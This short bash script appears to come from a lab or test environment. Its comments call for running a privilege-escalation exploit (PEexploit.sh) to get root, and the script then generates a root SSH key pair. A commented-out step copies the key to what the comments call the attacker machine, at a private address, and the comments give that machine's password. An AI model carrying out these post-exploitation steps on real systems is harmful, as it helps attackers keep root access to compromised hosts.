#!/bin/bash

# Run PEexploit.sh located at /home/resch to ensure that privilege escalation has happened and the current user is root

# Generate SSH key pair and copy it to the attacker machine:
ssh-keygen -t rsa -f /root/.ssh/id_rsa_Cserver_test10 -N ""
chmod 400 /root/.ssh/id_rsa_Cserver_test10.pub

# ssh-copy-id cannot be automated, need to be manually typed
# ssh-copy-id -i /root/.ssh/id_rsa_Cserver_test10.pub vagrant@172.18.0.3

# type in the password of 172.18.0.3:
# vagrant